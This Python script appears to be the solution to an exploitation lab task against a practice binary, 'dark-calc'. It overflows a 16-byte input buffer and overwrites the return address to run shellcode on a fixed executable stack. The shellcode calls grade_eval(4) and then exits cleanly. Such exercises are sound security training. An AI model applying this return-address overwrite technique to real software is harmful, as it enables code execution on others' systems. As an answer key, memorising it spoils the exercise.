#!/usr/bin/env python3
"""Task 2: 栈空间执行 —— 在固定可执行栈上运行 shellcode，调用 grade_eval(4)。

dark-calc 启动时用 mmap 固定了一块 RWX 栈（0x721000000000 起），
input 的 expression 缓冲区固定在 0x721000800fd0。
shellcode: mov edi, 4; mov eax, grade_eval; jmp rax。
grade_eval 返回后跳到 exit@plt，干净退出。
"""
import struct
import sys

GRADE_EVAL = 0x401A87       # grade_eval 的地址
EXIT_PLT = 0x401880         # exit@plt
SHELLCODE_ADDR = 0x721000800FD0  # expression 缓冲区（固定栈）

shellcode = b""
shellcode += b"\xbf\x04\x00\x00\x00"   # mov edi, 4
shellcode += b"\xb8\x87\x1a\x40\x00"   # mov eax, 0x401a87 (grade_eval)
shellcode += b"\xff\xe0"               # jmp rax

payload = shellcode
payload += b"\x90" * (16 - len(shellcode))   # 填满 expression（16 字节）
payload += b"\x90" * 8                        # saved rbp（无所谓）
payload += struct.pack("<Q", SHELLCODE_ADDR)  # 返回地址 -> shellcode
payload += struct.pack("<Q", EXIT_PLT)        # grade_eval 返回后的落点 -> exit@plt
payload += b"\n"

sys.stdout.buffer.write(payload)
